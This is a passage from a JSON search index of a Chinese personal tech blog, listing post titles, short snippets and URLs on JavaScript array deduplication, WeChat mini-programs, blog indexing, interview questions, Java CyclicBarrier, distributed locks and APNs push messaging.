Array(1000000),","lvl0":"多种数组去重性能对比","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"69d0cf43f25a31734c39f66bbb73741d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/06.%E5%A4%9A%E7%A7%8D%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/"},{"content":"小程序笔记 基础课程部分 微信公众平台 https://mp.weixin.qq.com/ 注册时可选择类型：订阅号、服务号、小程序、企业微信 每个邮箱仅能注册一个小程序。 个人类型小程序：无法使用微","lvl0":"小程序笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"2c32b09adf561bf72142c753f4258b10","tags":["小程序"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/40.%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0/"},{"content":"解决百度无法收录搭建在GitHub上的静态博客的问题 ::: warning 如果你正在寻找本博客的搭建文档，博主建议您查看这个仓库的README。 ::: 背景 由于Gi","lvl0":"解决百度无法收录搭建在GitHub上的个人博客的问题","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"89276fd7c9d49d0da90f99cc7e371f39","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/01.%E8%A7%A3%E5%86%B3%E7%99%BE%E5%BA%A6%E6%97%A0%E6%B3%95%E6%94%B6%E5%BD%95%E6%90%AD%E5%BB%BA%E5%9C%A8github%E4%B8%8A%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E9%97%AE%E9%A2%98/"},{"content":"面试问题集锦 请做一下自我介绍 回答提示： 一般人回答这个问题过于平常，只说姓名、年龄、工作经验，这些在简历上都有。其实，企业最希望知道的是求职者","lvl0":"面试问题集锦","lvl1":["更多","面试"],"lvl2":"摘要","objectID":"787301c7c1e4211e685a87bab9d9d2b4","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/03.%E9%9D%A2%E8%AF%95/01.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/"},{"content":"cyclicBarrier 用法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public static void main(String[] args) { CyclicBarrier cb = new CyclicBarrier(2); new Thread(()-\u0026gt; { try { cb.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.p","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"3430685894c929b392ca3eebeba15b80","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/cyclicbarrier/"},{"content":"你看到的未读消息提醒是真的吗？【分布式锁解决的问题】 消息和未读不一致的原因 那么在即时消息场景中，究竟会有哪些情况导致消息和未读数出现“不一致","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"8e45f3737f0d4690eba1669a9c53f9af","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81_%E6%B6%88%E6%81%AF%E6%9C%AA%E8%AF%BB%E6%95%B0/"},{"content":"APNs：聊一聊第三方系统级消息通道的事 在即时消息场景下，我们会依赖服务端推送技术来提升消息到达的实时性，以及通过各种手段来保证消息收发通道","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"47cd2aff9b420277f5d581e2be71078a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%89%8B%E6%9C%BAapp%E7%B3%BB%E7%BB%9F%E6%B6%88%E6%81%AF%E9%80%9A%E9%81%93apns/"}]